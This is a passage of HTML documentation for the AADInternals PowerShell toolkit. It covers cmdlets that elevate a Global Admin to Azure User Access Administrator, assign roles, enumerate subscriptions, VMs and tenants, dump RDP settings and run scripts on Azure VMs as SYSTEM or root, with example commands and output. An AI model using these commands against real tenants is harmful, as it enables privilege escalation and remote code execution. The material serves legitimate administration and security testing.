						ame&gt;FLOW_O365_P3&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;PowerAppsService&lt;/ServiceType&gt;&lt;ServiceName&gt;POWERAPPS_O365_P
						3&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;OfficeForms&lt;/ServiceType&gt;&lt;ServiceName&gt;FORMS_PLAN_E5&lt;/ServiceName&gt;&lt;Provisio
						ningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Adallom&lt;/ServiceType&gt;&lt;ServiceName&gt;ADALLOM_S_STANDALONE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/
						ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;MicrosoftStream&lt;/ServiceType&gt;&lt;ServiceName&gt;STREAM_O365_E5&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;
						&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Deskless&lt;/ServiceType&gt;&lt;ServiceName&gt;Deskless&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;
						ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;THREAT_INTELLIGENCE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Teamspace
						API&lt;/ServiceType&gt;&lt;ServiceName&gt;TEAMS1&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;WindowsDefenderATP&lt;/ServiceType&gt;&lt;Servic
						eName&gt;WINDEFATP&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Windows&lt;/ServiceType&gt;&lt;ServiceName&gt;WIN10_PRO_ENT_SUB&lt;/Service
						Name&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;RMSOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;RMS_S_PREMIUM2&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;
						Disabled&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;AADPremiumService&lt;/ServiceType&gt;&lt;ServiceName&gt;AAD_PREMIUM_P2&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/Provis
						ioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;RMSOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;RMS_S_PREMIUM&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/ProvisioningStatus&gt;&lt;/ServiceSta
						tus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;RMSOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;RMS_S_ENTERPRISE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;Se
						rviceType&gt;MultiFactorService&lt;/ServiceType&gt;&lt;ServiceName&gt;MFA_PREMIUM&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;SCO&lt;/Ser
						viceType&gt;&lt;ServiceName&gt;INTUNE_A&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;AADPremiumService&lt;/ServiceType&gt;&lt;ServiceName&gt;
						AAD_PREMIUM&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;YammerEnterprise&lt;/ServiceType&gt;&lt;ServiceName&gt;YAMMER_ENTERPRISE&lt;/S
						erviceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Sway&lt;/ServiceType&gt;&lt;ServiceName&gt;SWAY&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/
						ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;SharePoint&lt;/ServiceType&gt;&lt;ServiceName&gt;SHAREPOINTWAC&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/Serv
						iceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;SharePoint&lt;/ServiceType&gt;&lt;ServiceName&gt;SHAREPOINTENTERPRISE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;Service
						Status&gt;&lt;ServiceType&gt;ProjectWorkManagement&lt;/ServiceType&gt;&lt;ServiceName&gt;PROJECTWORKMANAGEMENT&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus
						&gt;&lt;ServiceType&gt;MicrosoftOffice&lt;/ServiceType&gt;&lt;ServiceName&gt;OFFICESUBSCRIPTION&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;M
						icrosoftCommunicationsOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;MCOSTANDARD&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Microsoft
						CommunicationsOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;MCOMEETADV&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;MicrosoftCommunica
						tionsOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;MCOEV&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceNa
						me&gt;LOCKBOX_ENTERPRISE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;SCO&lt;/ServiceType&gt;&lt;ServiceName&gt;INTUNE_O365&lt;/ServiceName
						&gt;&lt;ProvisioningStatus&gt;PendingActivation&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;EXCHANGE_S_ENTERPRISE&lt;/ServiceName&gt;&lt;Provisi
						oningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;EXCHANGE_ANALYTICS&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/P
						rovisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;EQUIVIO_ANALYTICS&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/Ser
						viceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;PowerBI&lt;/ServiceType&gt;&lt;ServiceName&gt;BI_AZURE_P2&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;Ser
						viceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;ATP_ENTERPRISE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;PendingProvisioning&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Adall
						om&lt;/ServiceType&gt;&lt;ServiceName&gt;ADALLOM_S_O365&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;PendingInput&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;/LicenseInformation&gt;&lt;LicenseInformation&gt;&lt;SKUPartNumber
						&gt;EMSPREMIUM&lt;/SKUPartNumber&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;EXCHANGE_S_FOUNDATION&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;PendingProvisioning&lt;/ProvisioningSta
						tus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;AzureAdvancedThreatAnalytics&lt;/ServiceType&gt;&lt;ServiceName&gt;ATA&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStat
						us&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Adallom&lt;/ServiceType&gt;&lt;ServiceName&gt;ADALLOM_S_STANDALONE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;PendingInput&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatu
						s&gt;&lt;ServiceType&gt;RMSOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;RMS_S_PREMIUM2&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;RMSOnline&lt;
						/ServiceType&gt;&lt;ServiceName&gt;RMS_S_PREMIUM&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;RMSOnline&lt;/ServiceType&gt;&lt;ServiceName&gt;
						RMS_S_ENTERPRISE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;SCO&lt;/ServiceType&gt;&lt;ServiceName&gt;INTUNE_A&lt;/ServiceName&gt;&lt;Provis
						ioningStatus&gt;PendingInput&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;AADPremiumService&lt;/ServiceType&gt;&lt;ServiceName&gt;AAD_PREMIUM_P2&lt;/ServiceName&gt;&lt;ProvisioningStatus
						&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;MultiFactorService&lt;/ServiceType&gt;&lt;ServiceName&gt;MFA_PREMIUM&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/Provision
						ingStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;AADPremiumService&lt;/ServiceType&gt;&lt;ServiceName&gt;AAD_PREMIUM&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceS
						tatus&gt;&lt;/LicenseInformation&gt;&lt;/LicenseInformations&gt;&lt;/TenantUserInfo&gt;
Severity              : 2
OverridesChildren     : False
ProblemId             : 00000000-0000-0000-0000-000000000000
TimeCached            : 0001-01-01T00:00:00
SaraSymptomId         : 00000000-0000-0000-0000-000000000000
SaraWorkflowRunId     : 00000000-0000-0000-0000-000000000000
SaraSymptomRunId      : 00000000-0000-0000-0000-000000000000
SaraSessionId         : 00000000-0000-0000-0000-000000000000
Id                    : 81157ffa-d946-4bf8-8d6e-a391b96e4bf6
</code></pre>

<h2 id="azure-functions">Azure functions</h2>

<h3 id="grant-aadintazureuseraccessadminrole-ac">Grant-AADIntAzureUserAccessAdminRole (AC)</h3>

<p>Since version 0.3.3 <br>
Elevates the current authenticated Global Admin to Azure User Access Administrator.
This allows the admin for instance to manage all role assignments in all subscriptions of the tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># Grant Azure User Access Administrator role </span>
<span class="nb">Grant-AADIntAzureUserAccessAdminRole</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintazuresubscriptions-ac">Get-AADIntAzureSubscriptions (AC)</h3>

<p>Since version 0.3.3 <br>
Lists the tenant’s Azure subscriptions</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># Get all subscriptions of the current tenant</span>
<span class="nb">Get-AADIntAzureSubscriptions</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>subscriptionId                       displayName   state  
--------------                       -----------   -----  
867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 MyAzure001    Enabled
99fccfb9-ed41-4179-aaf5-93cae2151a77 Pay-as-you-go Enabled
</code></pre>

<h3 id="set-aadintazureroleassignment-ac">Set-AADIntAzureRoleAssignment (AC)</h3>

<p>Since version 0.3.3 <br>
Assigns a given role to the given user. Defaults to the current user.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># Grant Virtual Machine Contributor role to the current user</span>
<span class="nb">Set-AADIntAzureRoleAssignment</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-RoleName</span> <span class="s2">"Virtual Machine Contributor"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>roleDefinitionId : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0/providers/Microsoft.Authorization/roleDefinitions/9980e02c-c2be-4d73-94e8-173b1dc7cf3c
principalId      : 90f9ca62-2238-455b-bb15-de695d689c12
principalType    : User
scope            : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0
createdOn        : 2020-06-03T11:29:58.1683714Z
updatedOn        : 2020-06-03T11:29:58.1683714Z
createdBy        : 
updatedBy        : 90f9ca62-2238-455b-bb15-de695d689c12
</code></pre>

<h3 id="get-aadintazureclassicadministrators-ac">Get-AADIntAzureClassicAdministrators (AC)</h3>

<p>Since version 0.3.3 <br>
Returns classic administrators of the given Azure subscription</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>
<span class="nb">Get-AADIntAzureClassicAdministrators</span> <span class="n">-Subscription</span> <span class="s2">"4f9fe2bc-71b3-429f-8a63-5957f1582144"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>emailAddress                  role                                     
------------                  ----                                     
admin@company.onmicrosoft.com ServiceAdministrator;AccountAdministrator
co-admin@comapny.com          CoAdministrator
</code></pre>

<h3 id="get-aadintazureresourcegroups-ac">Get-AADIntAzureResourceGroups (AC)</h3>

<p>Since version 0.3.3 <br>
Lists Azure subscription ResourceGroups</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># List the Resource Groups</span>
<span class="nb">Get-AADIntAzureResourceGroups</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>name       location tags
----       -------- ----
Production westus   Production
Test       eastus   Test
</code></pre>

<h3 id="get-aadintazurevms-ac">Get-AADIntAzureVMs (AC)</h3>

<p>Since version 0.3.3 <br>
Lists Azure subscription Virtual Machines and shows the relevant information</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># List the VMs</span>
<span class="nb">Get-AADIntAzureVMs</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>resourceGroup name     location   id                                   computerName adminUserName vmSize          OS     
------------- ----     --------   --                                   ------------ ------------- ------          --     
PRODUCTION    Client   westus     c210d38b-3346-41d3-a23d-27988315825b Client       AdminUSer     Standard_A2_v2  Windows
PRODUCTION    DC       westus     9b8f8753-196f-4f24-847a-e5bcb751936d DC           AdminUSer     Standard_DS1_v2 Windows
PRODUCTION    Exchange westus     a12ffb24-a69e-4ce9-aff3-275f49bba315 Exchange     AdminUSer     Standard_DS2_v2 Windows
PRODUCTION    Server1  westus     c7d98db7-ccb5-491f-aaeb-e71f0df478b6 Server1      AdminUSer     Standard_DS1_v2 Windows
TEST          Server2  eastus     ae34dfcc-ad89-4e53-b0b4-20d453bdfcef Server2      AdminUSer     Standard_DS1_v2 Windows
TEST          Server3  eastus     f8f6a7c5-9927-47f9-a790-84c866f5719c Server3      AzureUser     Standard_B1ms   Linux
</code></pre>

<h3 id="invoke-aadintazurevmscript-ac">Invoke-AADIntAzureVMScript (AC)</h3>

<p>Since version 0.3.3 <br>
Runs a given script on the given Azure VM as a SYSTEM or root.</p>

<p><strong>Note!</strong> Although the scripts supports UTF-8, the response only shows ascii characters so any UTF-8 character is shown incorrectly (bug at Microsoft’s end).</p>

<p>Multi-line scripts are supported. Use `n as a line separator.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># Invoke "whoami" on Server2</span>
<span class="nb">Invoke-AADIntAzureVMScript</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-ResourceGroup</span> <span class="n">PRODUCTION</span> <span class="n">-Server</span> <span class="n">Server2</span> <span class="n">-Script</span> <span class="s2">"whoami"</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>[stdout]
nt authority\system

[stderr]
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># Invoke "whoami" on Server3</span>
<span class="nb">Invoke-AADIntAzureVMScript</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-ResourceGroup</span> <span class="n">TEST</span> <span class="n">-Server</span> <span class="n">Server3</span> <span class="n">-Script</span> <span class="s2">"whoami"</span> <span class="n">-VMType</span> <span class="n">Linux</span>
</code></pre></div>
<p></p>

<p><strong>Output2:</strong></p>

<pre><code>Enable succeeded: 
[stdout]
root

[stderr]
</code></pre>

<p><strong>Example3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># Invoke multi-line script on Server2</span>
<span class="nb">Invoke-AADIntAzureVMScript</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-ResourceGroup</span> <span class="n">PRODUCTION</span> <span class="n">-Server</span> <span class="n">Server2</span> <span class="n">-Script</span> <span class="s2">"whoami</span><span class="se">`n</span><span class="s2">Get-Process 123123123"</span>
</code></pre></div>
<p></p>

<p><strong>Output3:</strong></p>

<pre><code>[stdout]
nt authority\system

[stderr]
Get-Process : Cannot find a process with the name "123123123". Verify the process name and call the cmdlet again.
At C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\script42.ps1:2 char:1
+ Get-Process 123123123
+ ~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (123123123:String) [Get-Process], ProcessCommandException
    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.GetProcessCommand
</code></pre>

<p><strong>Example4:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List running processes of Server2</span>
<span class="nb">Invoke-AADIntAzureVMScript</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-ResourceGroup</span> <span class="n">PRODUCTION</span> <span class="n">-Server</span> <span class="n">Server2</span> <span class="n">-Script</span> <span class="s2">"Get-Process"</span>
</code></pre></div>
<p></p>

<p><strong>Output4:</strong></p>

<pre><code>
[stdout]
    727      36    14132      27092       5.94    396   0 svchost                                                      
    936      29    69796      76820       7.91    400   0 svchost                                                      
    664      22    15664      27432      39.39    464   0 svchost                                                      
    839      23     6856      24352       0.91    792   0 svchost                                                      
    785      17     4792      10968       4.75    892   0 svchost                                                      
    282      13     3020       9324       7.41   1052   0 svchost                                                      
   1889      96    38548      72480      24.86   1216   0 svchost                                                      
    642      35     8928      28452       0.50   1236   0 svchost                                                      
    519      24    19480      37620       4.08   1376   0 svchost                                                      
    411      17    15440      18076      29.81   1392   0 svchost                                                      
    833      41    10676      25512       2.02   1424   0 svchost                                                      
    317      11     2000       8840       0.08   1432   0 svchost                                                      
    380      31     7324      16320       0.39   1584   0 svchost                                                      
    211      12     1876       7524       0.22   1808   0 svchost                                                      
    199       9     1596       6916       0.00   1968   0 svchost                                                      
    200      10     2308       8344       0.06   2188   0 svchost                                                      
    146       8     1472       7144       0.06   3000   0 svchost                                                      
    468      21     6516      31128       0.33   3140   2 svchost                                                      
    173       9     4332      12968       0.72   3208   0 svchost                                                      
   2061       0      192        156      11.45      4   0 System                                                       
    340      17     3964      17324       0.13   3416   2 TabTip                                                       
    413      24    13016      34008       0.25   4488   2 TabTip                                                       
    103       7     1264       4756       0.00   3264   2 TabTip32                                                     
    216      22     4864      14260       0.08   1272   2 taskhostw                                                    
    446      24    17080      22096       0.39   2796   0 taskhostw                                                    
    150       9     1664       8984       0.03   1196   0 VSSVC                                                        
    946      45    62896      78976      13.22   2068   0 WaAppAgent                                                   
    119       6     1504       5800       0.02   4152   0 WaSecAgentProv                                               
    646      41    45220      68180      85.78   2088   0 WindowsAzureGuestAgent                                       
    131       9     2252       8344       0.03   3868   0 WindowsAzureNetAgent                                         
    174      11     1548       6916       0.11    552   0 wininit                                                      
    234      11     2588      11160       0.09    612   1 winlogon                                                     
    266      12     2456      10120       0.08   3428   2 winlogon                                                     
    178      10     2776       8368       0.02   4052   0 WmiPrvSE
	
[stderr]
</code></pre>

<h3 id="get-aadintazurevmrdpsettings-ac">Get-AADIntAzureVMRdpSettings (AC)</h3>

<p>Since version 0.3.3 <br>
Shows the RDP settings of the given VM</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span>

<span class="c"># Dump the RDP settings</span>
<span class="nb">Get-AADIntAzureVMRdpSettings</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-ResourceGroup</span> <span class="n">PRODUCTION</span> <span class="n">-Server</span> <span class="n">Server2</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Not domain joined
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\PortNumber: 3389
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\fDenyTSConnections: 
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\KeepAliveEnable: 1
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\KeepAliveInterval: 1
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\KeepAliveTimeout: 1
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\fDisableAutoReconnect: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritReconnectSame: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fReconnectSame: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritMaxSessionTime: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritMaxDisconnectionTime: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxDisconnectionTime: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxConnectionTime: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritMaxIdleTime: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxIdleTime: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxInstanceCount: 4294967295
</code></pre>

<h3 id="get-aadintazuretenants-ac">Get-AADIntAzureTenants (AC)</h3>

<p>Since version 0.4.0 <br>
Lists all Azure AD tenants the user has access to.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List the tenants</span>
<span class="nb">Get-AADIntAzureTenants</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Id                                   Country Name        Domains                                                                                                  
--                                   ------- ----        -------                                                                                                  
221769d7-0747-467c-a5c1-e387a232c58c FI      Firma Oy    {firma.mail.onmicrosoft.com, firma.onmicrosoft.com, firma.fi}              
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd US      Company Ltd {company.onmicrosoft.com, company.mail.onmicrosoft.com,company.com}
</code></pre>

<h3 id="get-aadintazureinformation-ac">Get-AADIntAzureInformation (AC)</h3>

<p>Since version 0.4.0 <br>
